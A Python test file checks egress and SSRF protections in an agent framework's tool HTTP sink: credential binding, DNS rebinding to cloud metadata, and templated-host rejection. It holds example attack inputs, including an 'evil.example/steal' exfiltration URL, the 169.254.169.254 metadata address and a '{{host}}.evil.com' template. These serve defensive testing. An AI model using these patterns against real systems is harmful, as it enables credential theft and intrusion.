"""ADR-0006 egress/SSRF integration tests for the manual tool sink.

These are the adversarial acceptance tests for slice 3: credential exfil is
rejected/dropped, a DNS rebind to metadata is refused at the socket, a
pre-existing config keeps working with its credential silently pinned to the
BASE-declared host, and a caller can never template the host portion of a URL.
"""

from __future__ import annotations

import ipaddress
from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest
from forge_agent.builder.manual import ManualToolBuilder
from forge_agent.builder.openapi import resolve_bound_credential
from forge_config.schema import (
    AuthConfig,
    AuthType,
    EgressAction,
    EgressPolicy,
    ManualTool,
    ManualToolAPI,
    SecretRef,
    SecretSource,
)
from forge_security.egress import EgressViolationError
from forge_security.egress import transport as transport_mod


class _Resolver:
    """Duck-typed SecretResolver returning a fixed token."""

    def resolve(self, ref: SecretRef) -> str:
        return "sekret"


def _bearer(
    *, allowed_hosts: list[str] | None = None, action: EgressAction = EgressAction.REJECT
) -> AuthConfig:
    return AuthConfig(
        type=AuthType.BEARER,
        token=SecretRef(source=SecretSource.ENV, name="TOK"),
        allowed_hosts=allowed_hosts or [],
        on_egress_violation=action,
    )


def _tool(url: str, auth: AuthConfig) -> ManualTool:
    return ManualTool(name="sink", description="d", api=ManualToolAPI(url=url, auth=auth))


def _mock_client() -> AsyncMock:
    resp = MagicMock()
    resp.json.return_value = {"ok": True}
    resp.raise_for_status.return_value = None
    client = AsyncMock(spec=httpx.AsyncClient)
    client.request = AsyncMock(return_value=resp)
    return client


class TestCredentialBindingAtManualSink:
    async def test_bound_credential_exfil_reject_raises(self) -> None:
        # Credential explicitly bound to api.example.com but the tool points at
        # evil.example -> confused-deputy exfil must be refused before send.
        auth = _bearer(allowed_hosts=["api.example.com"], action=EgressAction.REJECT)
        tool = ManualToolBuilder(
            _tool("https://evil.example/steal", auth), secret_resolver=_Resolver()
        ).build()
        with pytest.raises(EgressViolationError):
            await tool.function()

    async def test_bound_credential_exfil_drop_strips_header(self) -> None:
        auth = _bearer(allowed_hosts=["api.example.com"], action=EgressAction.DROP)
        client = _mock_client()
        tool = ManualToolBuilder(
            _tool("https://evil.example/steal", auth),
            http_client=client,
            secret_resolver=_Resolver(),
        ).build()
        await tool.function()
        headers = client.request.call_args.kwargs["headers"]
        assert "Authorization" not in headers

    async def test_bound_host_still_gets_credential(self) -> None:
        auth = _bearer(allowed_hosts=["api.example.com"])
        client = _mock_client()
        tool = ManualToolBuilder(
            _tool("https://api.example.com/data", auth),
            http_client=client,
            secret_resolver=_Resolver(),
        ).build()
        await tool.function()
        headers = client.request.call_args.kwargs["headers"]
        assert headers["Authorization"] == "Bearer sekret"


class TestPinToWhereYouWerePointed:
    def test_preexisting_config_pins_credential_to_base_host(self) -> None:
        # No allowed_hosts field at all -> credential is silently pinned to the
        # BASE-declared destination host.
        bc = resolve_bound_credential(
            _bearer(allowed_hosts=[]), _Resolver(), declared_host="api.example.com"
        )
        assert bc.allowed_hosts == frozenset({"api.example.com"})
        assert bc.headers == {"Authorization": "Bearer sekret"}

    def test_no_auth_yields_none_credential(self) -> None:
        bc = resolve_bound_credential(
            AuthConfig(type=AuthType.NONE), None, declared_host="api.example.com"
        )
        assert bc.allowed_hosts == frozenset()
        assert bc.headers == {}

    async def test_preexisting_config_still_calls_and_attaches(self) -> None:
        # End-to-end: an old config (bearer, no egress fields) behaves exactly
        # as before -- the call is made and the credential is attached.
        client = _mock_client()
        tool = ManualToolBuilder(
            _tool("https://api.example.com/data", _bearer()),
            http_client=client,
            secret_resolver=_Resolver(),
        ).build()
        result = await tool.function()
        assert result == {"ok": True}
        assert client.request.call_args.kwargs["headers"]["Authorization"] == "Bearer sekret"


class TestSocketLevelRebind:
    async def test_manual_call_to_rebound_metadata_is_blocked(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # No injected client -> the guarded client is built. The public-looking
        # host rebinds to AWS IMDS at connect time -> refused at the socket.
        monkeypatch.setattr(
            transport_mod, "candidate_ips", lambda h: [ipaddress.ip_address("169.254.169.254")]
        )
        tool = ManualToolBuilder(
            _tool("https://api.example.com/data", AuthConfig(type=AuthType.NONE)),
            egress_policy=EgressPolicy(),
        ).build()
        # Match the GUARD's message, not merely "a ConnectError": this host
        # does not resolve, so a revert to a raw client would also raise
        # ConnectError (a DNS failure) and pass spuriously.
        with pytest.raises(httpx.ConnectError, match="internal address"):
            await tool.function()


class TestTemplatedAuthorityRejected:
    def test_templated_host_rejected_at_build(self) -> None:
        auth = AuthConfig(type=AuthType.NONE)
        builder = ManualToolBuilder(_tool("https://{{host}}.evil.com/x", auth))
        with pytest.raises(ValueError, match="scheme/host"):
            builder.build()

    def test_templated_path_is_allowed(self) -> None:
        auth = AuthConfig(type=AuthType.NONE)
        # A placeholder in the path is fine -- only scheme/authority are locked.
        builder = ManualToolBuilder(_tool("https://api.example.com/data/{{id}}", auth))
        tool = builder.build()
        assert tool.name == "sink"

    def test_templated_scheme_rejected(self) -> None:
        auth = AuthConfig(type=AuthType.NONE)
        builder = ManualToolBuilder(_tool("{{scheme}}://api.example.com/x", auth))
        with pytest.raises(ValueError, match="scheme/host"):
            builder.build()
